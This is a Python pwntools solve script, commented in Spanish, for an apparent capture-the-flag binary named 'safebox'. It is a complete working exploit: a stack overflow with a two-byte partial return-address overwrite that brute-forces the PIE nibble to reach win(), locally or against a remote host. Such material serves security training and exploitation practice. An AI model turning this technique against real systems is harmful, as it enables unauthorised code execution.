#!/usr/bin/env python3
"""
PIE partial overwrite — 2-byte overwrite de la dirección de retorno.

Con PIE habilitado, solo los últimos 12 bits de win() son conocidos.
Los siguientes 4 bits (un nibble) deben ser brute-forced.
Probabilidad: 1/16 por intento. Esperado: ~8-16 intentos.

Uso:
  python3 solve.py              # local
  python3 solve.py REMOTE <ip> <port>
"""
import sys
from pwn import *

BINARY = './safebox'
elf = ELF(BINARY, checksec=False)

# win() offset dentro del binario — los últimos 12 bits son fijos
WIN_OFFSET = elf.symbols['win']
WIN_LOW12  = WIN_OFFSET & 0xFFF   # bits fijos independientemente de ASLR

print(f'[*] win() offset en binario: {hex(WIN_OFFSET)}')
print(f'[*] Últimos 12 bits fijos:   {hex(WIN_LOW12)}')
print(f'[*] Intentando 16 posibles nibbles superiores...')

attempts = 0
for page_nibble in range(0x10):
    # Construir los 2 bytes de la dirección parcial
    win_2bytes = (page_nibble << 12) | WIN_LOW12
    low_byte   = win_2bytes & 0xFF
    high_byte  = (win_2bytes >> 8) & 0xFF

    if args.REMOTE:
        p = remote(sys.argv[2], int(sys.argv[3]))
    else:
        p = process(BINARY, level='error')

    p.recvuntil(b'code: ')

    # 40 bytes de padding + 2 bytes de sobrescritura parcial del ret addr
    payload = b'A' * 40 + bytes([low_byte, high_byte])
    p.send(payload)

    attempts += 1
    try:
        out = p.recv(timeout=1)
        if b'SAFE OPENED' in out or b'CTF{' in out:
            print(f'\n[+] Exito en el intento {attempts} (nibble=0x{page_nibble:x})')
            print(out.decode(errors='replace'))
            try:
                print(p.recvall(timeout=1).decode(errors='replace'))
            except:
                pass
            p.close()
            sys.exit(0)
    except Exception:
        pass
    p.close()

print(f'[!] No se encontró en esta ronda ({attempts} intentos).')
print('[*] Repite el script — la aleatorización de ASLR puede requerir múltiples rondas.')
